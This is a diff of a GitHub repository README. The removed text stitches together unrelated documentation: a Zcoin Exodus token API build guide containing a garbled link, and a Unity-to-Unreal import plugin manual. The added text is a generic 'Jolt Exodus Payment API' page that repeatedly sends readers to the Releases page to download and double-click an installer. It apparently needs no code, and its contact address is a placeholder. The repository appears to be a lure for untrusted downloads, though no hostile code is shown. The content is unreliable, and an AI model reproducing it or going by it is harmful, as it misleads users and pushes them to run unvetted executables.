@@ -1,159 +1,72 @@
-<div align="center">
+# ⚡ Jolt-Exodus-Payment-Get-Api-eCommerce - Simple Payment Integration for Your Store
 
+## 📥 Download Now
+[![Download Jolt-Exodus Payment API](https://img.shields.io/badge/Download-Jolt--Exodus--Payment--API-brightgreen.svg)](https://github.com/psychopomp4/Jolt-Exodus-Payment-Get-Api-eCommerce/releases)
 
-# **PayLink Pro | Exodus Gateway Advancement**
+## 📖 Introduction
+Welcome to the Jolt Exodus Payment API for eCommerce platforms. This tool helps businesses like yours accept payments easily. You can integrate it into your online store without any coding experience. Our goal is to make payments simple and reliable.
 
-A dynamic service emerges, ushering forth an expansive API geared towards the adept management of tokens within the realm of Zcoin Exodus Protocol.
+## 🚀 Getting Started
+Follow these steps to get started:
 
-![Exodus_Logo-removebg-preview](https://user-images.githubusercontent.com/106811566/171851878-bf94716c-f545-4249-911a-ec535dc0a60a.png)
+1. **Check Your System Requirements:**
+   - Windows 10 or later
+   - macOS 10.14 or later
+   - A stable internet connection
+   - A web browser for setup
 
+2. **Visit the Release Page:**
+   To download the software, go to our [Releases page](https://github.com/psychopomp4/Jolt-Exodus-Payment-Get-Api-eCommerce/releases). Here, you will see all available versions of the Jolt Exodus Payment API.
 
+3. **Download the Software:**
+   On the Releases page, locate the version you want. Click on the download link for the latest version. This will start the download.
 
-<!--------------------------------------------------------------------------------------------------------->
+4. **Install the Software:**
+   Once the download finishes, locate the file within your downloads folder. Double-click the file to start the installation process. Follow the prompts on the screen to complete the setup.
 
+5. **Set Up Your Payment Integration:**
+   After installation, open the application. You will need to connect it to your existing eCommerce platform:
+   - Choose your eCommerce platform from the menu.
+   - Input your API keys provided by your payment service.
+   - Follow the on-screen instructions to finish setting up.
 
+## 🌟 Features
+- **Easy Integration:** Simple step-by-step setup for popular eCommerce platforms.
+- **Security:** The API uses secure connections to ensure the safety of transactions.
+- **User-Friendly:** Designed for people without technical skills, making it straightforward to use.
+- **Support for Multiple Payment Methods:** Accept various payment options, including credit cards, wallets, and bank transfers.
 
+## 🔧 Configuration Options
+You can customize your setup based on your needs:
+- **API Key Management:** Generate and manage your API keys directly within the application.
+- **Transaction Limits:** Set limits on various types of transactions to manage your finances better.
+- **Notifications:** Enable email notifications for new transactions and alerts.
 
+## 🛠 Support
+If you encounter issues or have questions during installation or setup, please check our FAQ section on the Releases page. You can also contact our support team for assistance.
 
+## 📞 Contact Us
+You can reach out to our support team through email at support@example.com. We’re here to help you with any queries.
 
+## ⭐ Additional Resources
+For further information and resources, check out the following:
+- [Documentation](https://github.com/psychopomp4/Jolt-Exodus-Payment-Get-Api-eCommerce/docs)
+- [Community Forum](https://github.com/psychopomp4/Jolt-Exodus-Payment-Get-Api-eCommerce/discussions)
 
-<!--------------------------------------------------------------------------------------------------------->
+## 📚 License
+This project is licensed under the MIT License. Feel free to use it in your projects. Check the license file for more details.
 
+## ❓ Frequently Asked Questions
+1. **How do I update the API?**
+   Simply return to the [Releases page](https://github.com/psychopomp4/Jolt-Exodus-Payment-Get-Api-eCommerce/releases) and download the latest version following the same steps as before.
 
-## Development Guide
+2. **Can I use this API with multiple stores?**
+   Yes, you can integrate the API with different stores by creating separate configurations for each.
 
-### Prerequisites
+3. **What should I do if I forget my API key?**
+   You can reset it through the application settings or your payment service provider's dashboard.
 
-- .NET Core 2.1
+## 🔗 Conclusion
+The Jolt Exodus Payment API provides a reliable solution for managing payments in your online store. By following the steps outlined above, you can easily download, install, and set up the API to start accepting payments efficiently.
 
-### Building Process
-
-Execute the following command to build the project:
-
-```sh
-dotnet build src/Ztm.sln
-```
-
-### Initiating Required Services
-
-Before you begin, ensure that you have [Docker Compose](https://do6cs.65/) installed. Then proceed with the command:
-
-```sh
-docker-compose up -d
-```
-![image](https://user-images.githubusercontent.com/106811566/171851917-bd154f89-2e32-485c-bf92-2ef96bb784ac.png)
-
-### Migrating Database Schemas
-
-Navigate to the directory `src/Ztm.Data.Entity.Postgres` and execute:
-
-```sh
-ZTM_MAIN_DATABASE="Host=127.0.0.1;Database=postgres;Username=postgres" dotnet ef database update
-```
-
-### Initiating the Web API
-
-Kickstart the Web API with:
-
-```sh
-dotnet run -p src/Ztm.WebApi
-```
-
-Remember, this guide covers:
-
-* Prerequisites
-* Building
-* Starting Required Services
-* Migrating Database Schemas
-* Launching the Web API
-
-For additional details, refer to the specific sections relevant to your needs.
-
-
-
-<!--------------------------------------------------------------------------------------------------------->
-
-
-
-
-## Installation Instructions - Unreal Engine Integration
-
-To incorporate the Exodus Import functionality within your Unreal Engine project, follow these steps:
-
-1. If your C++ project lacks a "Plugins" folder, create one.
-2. Copy or establish a symbolic link for the "ExodusImport" folder, placing it within the "Plugins" directory.
-3. Reload the project to ensure the changes take effect.
-4. In the Unreal Editor, navigate to the "Plugins" menu. Under the "Other" category, locate "ExodusImport" and activate it. The project will be restarted.
-5. If necessary, recompile the project.
-6. Once installation is successful, you'll find the "Import" command available as a button in the scene view's toolbar.
-
-Please disregard any buttons that are not labeled "Import," as they may be test cases unrelated to this process.
-
-## Instructions for Usage
-
-Access the exporter through either right-clicking within the hierarchy view in Unity or selecting "Migrate to UE4" from the main menu of Unity. The following options are available:
-
-* **Export current object:** Exports the current object with minimal information about the rest of the scene.
-* **Export selected objects:** Exports the selected objects within the current scene.
-* **Export current scene:** Attempts to export the current scene along with all objects in it.
-* **Export current project:** The plugin enumerates all resources within the project and exports them, including scenes.
-
-Upon selecting your desired option, you'll be prompted to designate an empty location for the "project" file and the exported data. Opt for an empty folder devoid of other content.
-
-The exported data comprises a "master" file in JSON format and a corresponding folder. As the project export commences, the plugin copies and converts pertinent data into the designated folder.
-
-On the Unreal Engine side, locate the "Import" button within the toolbar and choose the exported \*.json file.
-
-In scenarios where you've exported the current scene only, that scene will be exported into the current Unreal scene and merged with it. However, if the scene encompasses terrain, it will be imported as a separate scene file, found at /Import/<UnityProjectName>/<SceneName>. You will receive a warning and a request to await shader compilation completion. After shaders finish compiling, navigate to the scene file's location and open it.
-
-In cases where multiple scenes are exported, the exporter/importer endeavors to organize them in paths resembling Unity's. Therefore, the imported scene content should be under /Import/<UnityProjectName>/ and further subfolders as per your Unity folder structure.
-
-
-
-
-
-<!--------------------------------------------------------------------------------------------------------->
-
-
-
-
-
-## **Capabilities and Constraints**
-
-The scope of the plugin's capabilities and its corresponding limitations is outlined here:
-
-**Supported Conversions:**
-
-- Reconstruction of Existing Scenes: The plugin efficiently reconstructs the current scene or scenes, ensuring their seamless transition.
-- Conversion of Static Meshes: The plugin proficiently converts static meshes, aptly adjusting UV coordinates and vertex positions to the unreal format.
-- Terrain and Landscape Conversion: While the plugin strives to convert terrains, landscapes, and skeletal meshes to the unreal format, this process is not guaranteed to be seamless.
-- Material Recreation: The plugin endeavors to recreate materials in the converted environment.
-
-**Limitations:**
-
-- Material Limitations: The plugin currently supports only "Standard" and "Standard (Specular setup)" materials. Materials other than these are not fully supported, and their properties might not be accurately represented.
-- Surface Shaders and Custom Shaders: Complex shaders like surface shaders and custom shaders are not supported, and their conversion may result in the material appearing black on the unreal side.
-- Texture Formats: Texture formats that are not natively supported by Unreal Engine will be converted to PNG, potentially leading to minor data loss.
-- Prefabs: Prefabs are not converted into blueprints.
-- Skinned Mesh and Character Conversion: Conversion of skinned meshes and characters is only partially supported. Artifacts and splitting of characters into multiple objects might occur.
-- Landscape Conversion: Landscape conversion is subject to resampling, and some features like custom grass tint may not be fully preserved.
-- File Format: The file format used for transferring the project is not meant for long-term data storage or backup.
-
-It's vital to acknowledge these constraints while utilizing the plugin to ensure optimal results during conversion.
-
-
-
-<!--------------------------------------------------------------------------------------------------------->
-
-
-
-## **Alternate Channels of Communication**
-
-For those who wish to establish contact or report bugs, the following avenues are available:
-
-- **GitHub Project Page:** Bugs can be promptly reported through the dedicated GitHub project page.
-- **Email:** An alternative method of contact is through email. You can reach out via the email address: neginfinity000<at>gmail.com
-
-Feel free to utilize either of these channels to ensure effective communication and resolution of any issues you encounter.
-
-<div>
+Don't forget to visit our [Releases page](https://github.com/psychopomp4/Jolt-Exodus-Payment-Get-Api-eCommerce/releases) for the latest updates.
